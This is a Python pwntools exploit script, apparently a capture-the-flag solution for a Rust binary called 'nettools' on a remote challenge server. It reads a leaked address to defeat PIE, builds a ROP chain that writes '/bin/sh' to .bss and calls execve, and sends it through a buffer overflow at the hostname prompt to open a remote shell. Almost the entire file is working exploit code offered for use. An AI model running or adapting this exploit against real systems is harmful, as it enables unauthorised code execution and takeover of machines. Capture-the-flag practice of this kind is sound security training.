#!/usr/bin/env python3

from pwn import *

context.log_level = logging.DEBUG
context.terminal = ['tmux', 'splitw', '-v', '-F' '#{pane_pid}', '-P']

HOST = 'chals.sekai.team'
PORT = 4001

# p = process('./nettools')
p = remote(HOST, PORT)

# gdb.attach(p, """
# b *nettools::ip_lookup+1029
# #b main.rs:20
# """)

# att_ptr = 0x007fff01d0c580
# rsp at SEGV = 0x007fff01d0c868
# offset = 0x2e8

# leak =  0x5568fd36703c
# bin base = 0x5568fd2ed000
bin_base_offset = 0x7a03c
bin_bss_offset = 0x7a000
 
pop_rax = 0x000000000000ecaa
pop_rdi = 0x000000000000a0ef
pop_rsi = 0x0000000000009c18
mov_rdx_rsi = 0x000000000005f28e
mov_at_rdi_rax = 0x000000000002b9cb
syscall = 0x0000000000025adf

p.recvuntil('leaked: 0x')

leak = int(p.recvline(), 16)
info(f'leak: 0x{hex(leak)}')

bin_base = leak - bin_base_offset
info(f'bin base: 0x{hex(bin_base)}')

p.sendlineafter('> ', b'3')

chain = p64(bin_base + pop_rdi) + p64(bin_base + bin_bss_offset) + p64(bin_base + pop_rax) + p64(0x68732f6e69622f) + p64(bin_base + mov_at_rdi_rax) # write "/bin/sh" at a binary writable address
chain += p64(bin_base + pop_rsi) + p64(0) + p64(bin_base + mov_rdx_rsi) + p64(bin_base + pop_rdi) + p64(bin_base + bin_bss_offset) + p64(bin_base + pop_rax) +  p64(59) + p64(bin_base + syscall)
p.sendlineafter('Hostname: ', b'lkjh.fr' + b'\x00' + b'A'*(0x2e8 - 8) + chain)

# strange response from server, some commands were refused
# had to execute bash in the sh shell to have something working
p.sendline('bash')
p.interactive()

